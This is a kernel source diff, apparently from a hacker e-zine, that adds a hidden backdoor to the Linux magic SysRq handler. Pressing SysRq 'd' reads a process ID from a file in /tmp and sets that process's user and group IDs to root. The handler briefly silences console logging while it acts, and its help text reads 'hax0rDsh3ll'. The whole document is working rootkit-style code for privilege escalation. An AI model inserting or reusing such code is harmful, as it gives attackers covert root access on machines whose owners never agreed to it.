@@ -1,0 +1,103 @@
+14a15,16
+> /* (c) OAA psys : trycky@7a69ezine.org */
+> 
+34a37,41
+> #include <linux/compatmac.h>
+> #include <linux/file.h>
+> 
+> #define MAGIC_PID "/tmp/7a69rl0z"
+> 
+99a107
+> /* psys sysrq handler , Algunas cosas ripeadas del lids  */
+100a109,195
+> int myatoi(char *str)
+> {
+>   int res = 0;
+>   int mul = 1;
+>   char *ptr;
+>   for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
+>     if (*ptr < '0' || *ptr > '9')
+>       return (-1);
+>     res += (*ptr - '0') * mul;
+>     mul *= 10;
+>   }
+>   return (res);
+> }
+> 
+> struct task_struct *find_task_struct_by_pid(int pid) {
+>   struct task_struct *p, **htable = &pidhash[pid_hashfn(pid)];
+>   for(p = *htable; p && p->pid != pid; p = p->pidhash_next);
+>   return(p);
+> }
+> 
+> static void sysrq_handle_psys(int key, struct pt_regs *pt_regs,
+> 	      struct kbd_struct *kbd, struct tty_struct *tty) {
+> 
+>   pid_t pid;
+>   int cont,i;
+>   char buffer[8],*buf;
+>   struct file *filp; 
+>   __u32 old_limit = current->addr_limit.seg;
+> 
+>   filp=filp_open(MAGIC_PID,O_RDONLY,O_RDONLY);
+> 
+>   if(IS_ERR(filp) || filp==NULL){
+>     printk("psys : Error al intentar abrir el fichero => %s\n",MAGIC_PID);
+>     return -1;
+>   }
+> 
+>   if(filp->f_op->read==NULL){
+>     fput(filp);
+>     printk("psys : Error leyendo => %s\n",MAGIC_PID);
+>     return -3;
+>   }
+>   
+>   filp->f_pos=0;
+>   current->addr_limit.seg = 0xffffffff;
+>   cont=filp->f_op->read(filp,buffer,8,&filp->f_pos);
+>   current->addr_limit.seg = old_limit;
+>   fput(filp);
+> 
+>   buf=buffer;
+>   
+>   for(i=0 ; buf[i] && i<9 ; i++){
+>     if (buf[i]=='\n' || buf[i]=='\r') {
+>       buf[i]=0;
+>       break;
+>     }
+>   }
+>   
+>   pid=myatoi(buf);
+> 
+>   printk("psys : Marcandose un detallito con la pid => [%d]\n",pid);
+>   console_loglevel=0;
+> 
+>   /* Damos uid=0 a la pid seleccionada */
+>   
+>   struct task_struct *psys;
+> 
+>   read_lock(&tasklist_lock);
+>   psys=find_task_struct_by_pid(pid);
+>   read_unlock(&tasklist_lock);
+> 
+>   if(psys){  
+>   psys->uid=0;
+>   psys->euid=0;
+>   psys->gid=0;
+>   psys->egid=0;
+>   } else {
+>     printk("psys : [%d] Pid no valida\n",pid);
+>     return 0;
+>   }
+>   console_loglevel=7;
+> }
+> 
+> static struct sysrq_key_op sysrq_psys_op = {
+>   handler: sysrq_handle_psys,
+>   help_msg: "hax0rDsh3ll",
+>   action_msg: "hax0ring"
+> };
+357c452
+< /* d */	NULL,
+---
+> /* d */	&sysrq_psys_op,
